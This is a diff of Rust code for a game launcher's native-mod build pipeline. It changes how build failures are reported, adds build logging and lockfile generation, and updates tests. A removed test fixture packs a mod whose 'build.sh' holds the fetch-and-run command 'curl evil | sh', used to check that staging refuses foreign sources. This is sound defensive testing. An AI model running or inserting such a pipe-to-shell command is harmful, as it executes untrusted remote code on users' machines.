@@ -300,7 +300,12 @@ pub fn mixins_from_source(on: bool) {
 /// The failed build's error, led by its blamed mod in the launcher's own words, as [`compile_failed_mod`] and [`refused_mod`] read it.
 fn blamed_text(failed: tool::Failure) -> String {
     let lead = match failed.blame {
-        None => {
+        // A build script refused by a tool made before mods could run them: its error says so.
+        None
+        | Some(tool::Blame {
+            kind: tool::BlameKind::BuildScript,
+            ..
+        }) => {
             return trf(
                 "The native build failed: {error}",
                 &[("error", &failed.error)],
@@ -310,10 +315,6 @@ fn blamed_text(failed: tool::Failure) -> String {
             mod_id,
             kind: tool::BlameKind::Compile,
         }) => failure(&compiling_mod(&mod_id), tr("see the build log"), &[], &[]),
-        Some(tool::Blame {
-            mod_id,
-            kind: tool::BlameKind::BuildScript,
-        }) => Refusal::BuildScript { mod_id }.to_string(),
         Some(tool::Blame {
             mod_id,
             kind: tool::BlameKind::Features,
@@ -992,17 +993,14 @@ pub fn compile_failed_mod<'a>(error: &str, ids: &'a [String]) -> Option<&'a Stri
         .find(|id| error.contains(&format!("{} (", build_log::failed(&compiling_mod(id)))))
 }
 
-/// The mod among `ids` whose build script or features stopped the build `error` describes, and
-/// why: `error` holds that refusal word for word (the build log keeps it).
+/// The mod among `ids` whose features stopped the build `error` describes, and why: `error`
+/// holds that refusal word for word (the build log keeps it).
 pub fn refused_mod<'a>(error: &str, ids: &'a [String]) -> Option<(&'a String, Refusal)> {
     ids.iter().find_map(|id| {
-        [
-            Refusal::BuildScript { mod_id: id.clone() },
-            Refusal::Features { mod_id: id.clone() },
-        ]
-        .into_iter()
-        .find(|refusal| error.contains(&refusal.to_string()))
-        .map(|refusal| (id, refusal))
+        let refusal = Refusal::Features { mod_id: id.clone() };
+        error
+            .contains(&refusal.to_string())
+            .then_some((id, refusal))
     })
 }
 
@@ -1428,6 +1426,25 @@ fn resolve_build_dependencies(
         .map_err(|error| format!("code link requirements refused: {error}"))
 }
 
+/// [`build_stages`] as one step of the launcher log, so a build that hangs shows in the Logs panel.
+fn pipeline(
+    lease: &crate::native_cache::Cache,
+    base: &str,
+    folder: &Path,
+    profile: Profile,
+    target: Target,
+    options: BuildOptions<'_>,
+    progress: &impl Fn(Step),
+) -> Result<Built, Failed> {
+    let step = crate::game_log::launcher::step(format!("Building native mods for {base}"));
+    let built = build_stages(lease, base, folder, profile, target, options, progress);
+    match &built {
+        Ok(built) => step.done(&built.version),
+        Err(error) => step.failed(error.to_string()),
+    }
+    built
+}
+
 /// The pipeline both targets build with ([`build`], [`build_server`]): `folder`'s mods on the
 /// Sunrise revision they pin (else `base`'s, the installed version whose game files the build
 /// reuses: a native build's own revision when it is one, [`base_for`]), compiled as `target`
@@ -1440,7 +1457,7 @@ fn resolve_build_dependencies(
 /// failures without leaving anything out.
 /// Nothing of the player's outside the launcher's data is touched: no instance is edited and
 /// no version selected here.
-fn pipeline(
+fn build_stages(
     lease: &crate::native_cache::Cache,
     base: &str,
     folder: &Path,
@@ -1931,6 +1948,24 @@ fn pipeline(
         }
         let game = workspace.package(game).map_err(|e| e.to_string())?;
         let work = workspace.work();
+        // A package carries the registry lock `cargo sunrise-mod build` wrote; a source folder may
+        // have none yet. It gets the lock `native-lock` writes, from this build's tool and with
+        // the same kept game lock, which runs none of the mod's code. The author's folder is
+        // never written to.
+        for bundle in &mods {
+            let copy = compiled.join(&bundle.manifest.id);
+            if !copy.join("Cargo.lock").exists() {
+                internals_sync::run(
+                    program,
+                    &rust,
+                    &root(),
+                    &copy,
+                    "native-lock",
+                    serde_json::json!({"update": false}),
+                    cancellation,
+                )?;
+            }
+        }
         // The libraries an earlier build of these mods kept (`kept`), copied in so the tool
         // compiles only the mods whose own inputs changed. Without them, every mod compiles.
         let seeding = std::time::Instant::now();
@@ -1988,6 +2023,7 @@ fn pipeline(
                 mixins_from_source,
             },
             &|id, done, total| {
+                crate::game_log::launcher::line(format!("Compiling {id}"));
                 progress(Step::Mod {
                     id: id.to_owned(),
                     done,
@@ -3761,6 +3797,21 @@ mod tests {
         fs::write(project.join("src/lib.rs"), helper).unwrap();
     }
 
+    /// The tool of a game build made before mods could run build scripts still blames one: its
+    /// failure reads as that tool's own error.
+    #[test]
+    fn an_older_tools_build_script_blame_reads_as_its_error() {
+        let error = "E_NATIVE_BUILD_SCRIPT: scripted has a build script".to_string();
+        let blame = serde_json::from_str(r#"{"mod":"scripted","kind":"build-script"}"#).unwrap();
+        assert_eq!(
+            blamed_text(tool::Failure {
+                error: error.clone(),
+                blame: Some(blame),
+            }),
+            format!("The native build failed: {error}")
+        );
+    }
+
     #[test]
     fn retired_native_fields_are_refused_before_bundle_projection() {
         let root = dir("retired-native-fields");
@@ -3887,7 +3938,7 @@ mod tests {
     }
 
     #[test]
-    fn flat_projects_use_manifest_identity_and_reject_old_roots() {
+    fn flat_projects_use_manifest_identity_and_read_old_root_names_as_files() {
         let root = dir("project-layout");
         write_native(&root, "example", A, B);
         assert_eq!(bundle_in(&root).unwrap().unwrap().manifest.id, "example");
@@ -3904,6 +3955,7 @@ mod tests {
             project_manifest("example", "1", A, B),
         )
         .unwrap();
+        // Files the retired layouts named are ordinary project files now.
         for old in [
             "sunrise-native.json",
             "horizon-mixin.toml",
@@ -3911,7 +3963,11 @@ mod tests {
             "rust",
         ] {
             fs::write(root.join(old), "").unwrap();
-            assert!(bundle_in(&root).is_err(), "{old}");
+            assert_eq!(
+                bundle_in(&root).unwrap().unwrap().manifest.id,
+                "example",
+                "{old}"
+            );
             fs::remove_file(root.join(old)).unwrap();
         }
         fs::remove_dir_all(root).unwrap();
@@ -3994,8 +4050,8 @@ mod tests {
             )
             .unwrap()
         );
-        pack("veinminer.smod", Some(("build.sh", "curl evil | sh")));
-        assert!(stage().is_err(), "only Rust and TOML sources");
+        pack("veinminer.smod", Some(("vendor/lib.c", "\x7fELF\x02\x01")));
+        assert!(stage().is_err(), "a prebuilt binary among the source");
     }
 
     /// A player's report (11-04): Right-Click Crops 1.0.0 pins Nightly 2026-10-31's commit, so
@@ -4325,7 +4381,7 @@ mod tests {
         for (path, bytes) in [
             ("assets/exported/probe.txt", "asset"),
             ("data/exported/native/probe.json", "{}"),
-            ("jars/cache.jar", "not a project file"),
+            ("target/cache.jar", "not a project file"),
         ] {
             let path = project.join(path);
             fs::create_dir_all(path.parent().unwrap()).unwrap();
@@ -4397,7 +4453,7 @@ mod tests {
             fs::read(package.join("data/exported/native/probe.json")).unwrap(),
             b"{}"
         );
-        assert!(!package.join("jars").exists());
+        assert!(!package.join("target").exists());
         assert!(!output.join(native_dir).join("stale").exists());
         eprintln!("NATIVE_SERVER_EXPORT_STEP=load_runtime");
         let runtime = sunrise_launcher_smod::packages::adjacent_manifests(
